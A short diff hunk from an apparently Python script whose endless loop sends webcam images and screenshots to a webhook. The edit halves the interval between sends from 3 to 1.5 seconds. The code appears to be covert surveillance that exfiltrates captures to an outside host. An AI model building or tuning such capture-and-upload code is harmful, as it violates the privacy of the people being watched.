@@ -90,4 +90,4 @@ while True:
     
     embed_sent = webhook(WEBHOOK, webcam_image, screenshot_image, embed_sent)
     
-    time.sleep(3)
+    time.sleep(1.5)
